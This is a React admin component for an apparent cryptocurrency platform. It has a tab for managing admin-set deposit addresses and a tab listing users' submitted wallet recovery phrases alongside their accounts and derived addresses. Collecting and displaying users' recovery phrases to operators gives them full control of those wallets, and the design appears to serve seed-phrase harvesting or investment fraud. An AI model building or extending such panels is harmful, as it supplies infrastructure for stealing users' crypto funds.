'use client';

import { useState } from 'react';
import { AdminDepositAddressesManager } from '@/components/admin/AdminDepositAddressesManager';
import { AdminWalletsTable } from '@/components/admin/AdminWalletsTable';
import type { DepositAddressRecord } from '@/lib/queries';
import type { WalletSubmission } from '@/lib/types';

interface AdminWalletsHubProps {
    submissions: WalletSubmission[];
    users: { id: string; email: string; display_name: string }[];
    depositAddresses: DepositAddressRecord[];
}

export function AdminWalletsHub({ submissions, users, depositAddresses }: AdminWalletsHubProps) {
    const [activeTab, setActiveTab] = useState<'deposit' | 'phrases'>('deposit');

    const totalCoinsConfigured = depositAddresses.filter((d) => Boolean(d.address)).length;

    return (
        <div className="space-y-6">
            {/* Top Navigation Tabs */}
            <div className="border-b border-[#e5e7eb] bg-white rounded-2xl p-2 shadow-sm border">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                    <nav className="flex space-x-2" aria-label="Wallet management tabs">
                        <button
                            type="button"
                            onClick={() => setActiveTab('deposit')}
                            className={`flex items-center gap-2.5 px-4 py-2.5 rounded-xl text-sm font-semibold transition-all ${
                                activeTab === 'deposit'
                                    ? 'bg-[#1e3a8a] text-white shadow-sm'
                                    : 'text-[#4b5563] hover:text-[#0f172a] hover:bg-[#f3f4f6]'
                            }`}
                        >
                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                            </svg>
                            <span>Manage Deposit Addresses</span>
                            <span
                                className={`text-[11px] px-2 py-0.5 rounded-full font-bold ${
                                    activeTab === 'deposit'
                                        ? 'bg-white/20 text-white'
                                        : 'bg-[#eff6ff] text-[#1e3a8a]'
                                }`}
                            >
                                {totalCoinsConfigured}
                            </span>
                        </button>

                        <button
                            type="button"
                            onClick={() => setActiveTab('phrases')}
                            className={`flex items-center gap-2.5 px-4 py-2.5 rounded-xl text-sm font-semibold transition-all ${
                                activeTab === 'phrases'
                                    ? 'bg-[#1e3a8a] text-white shadow-sm'
                                    : 'text-[#4b5563] hover:text-[#0f172a] hover:bg-[#f3f4f6]'
                            }`}
                        >
                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" />
                            </svg>
                            <span>Linked Wallets & Phrases</span>
                            <span
                                className={`text-[11px] px-2 py-0.5 rounded-full font-bold ${
                                    activeTab === 'phrases'
                                        ? 'bg-white/20 text-white'
                                        : 'bg-[#fef3c7] text-[#92400e]'
                                }`}
                            >
                                {submissions.length}
                            </span>
                        </button>
                    </nav>

                    {/* Quick indicator info */}
                    <div className="hidden md:flex items-center gap-2 text-xs text-[#6b7280] pr-2">
                        <span className="w-2 h-2 rounded-full bg-[#16a34a]" />
                        <span>Live Sync Active</span>
                    </div>
                </div>
            </div>

            {/* Tab 1: Deposit Addresses Management */}
            {activeTab === 'deposit' && (
                <div className="animate-fade-in">
                    <AdminDepositAddressesManager initialAddresses={depositAddresses} />
                </div>
            )}

            {/* Tab 2: Linked Wallets & Recovery Phrases Table */}
            {activeTab === 'phrases' && (
                <div className="animate-fade-in space-y-4">
                    <div className="rounded-xl border border-amber-200 bg-amber-50 p-4 text-xs text-amber-900 flex items-start gap-3">
                        <span className="text-base">🔐</span>
                        <div>
                            <strong className="font-semibold block mb-0.5">Recovery Phrase Audit Security</strong>
                            Recovery phrase access is strictly logged in audit logs. Derived public addresses and attached client accounts are listed below.
                        </div>
                    </div>

                    <AdminWalletsTable
                        submissions={submissions}
                        users={users}
                        mode="queue"
                    />
                </div>
            )}
        </div>
    );
}
